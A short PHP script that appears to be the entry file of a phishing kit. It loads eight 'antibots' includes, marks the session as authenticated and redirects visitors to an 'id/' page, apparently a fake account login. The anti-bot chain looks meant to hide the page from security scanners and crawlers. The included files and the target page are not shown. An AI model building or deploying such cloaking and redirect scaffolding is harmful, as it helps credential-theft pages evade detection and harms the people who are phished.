<?php
include('./antibots/anti1.php');
include('./antibots/anti2.php');
include('./antibots/anti3.php');
include('./antibots/anti4.php');
include('./antibots/anti5.php');
include('./antibots/anti6.php');
include('./antibots/anti7.php');
include('./antibots/anti8.php');

session_start();
$_SESSION["auth"] = true;
header('Location:  id/');